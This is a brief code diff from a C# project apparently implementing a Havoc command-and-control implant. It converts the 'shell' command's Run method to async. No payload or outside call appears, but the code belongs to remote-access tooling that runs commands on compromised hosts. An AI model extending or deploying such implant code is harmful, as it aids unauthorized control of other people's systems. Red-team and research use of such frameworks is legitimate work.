@@ -15,7 +15,7 @@ namespace HavocImplant.AgentFunctions
         public override string Command => "shell";
         public override bool Dangerous => false;
 
-        public override void Run(int taskId)
+        public override async Task Run(int taskId)
         {
             Output = "";
             Process process = new Process();
